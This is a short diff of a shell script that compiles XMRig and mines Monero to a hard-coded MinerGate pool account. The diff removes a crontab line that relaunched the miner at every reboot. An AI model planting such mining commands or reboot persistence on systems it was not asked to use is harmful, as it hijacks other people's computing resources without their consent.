@@ -21,8 +21,6 @@ cd build
 # Install XMRig from source
 cmake ..
 make
-# Add Cronjob
-(crontab -l && echo "@reboot ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u slbtcpool@gmail.com -p x") | crontab -
 # Mine 
 ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u slbtcpool@gmail.com -p x
 echo "OPC Miner is Working !"
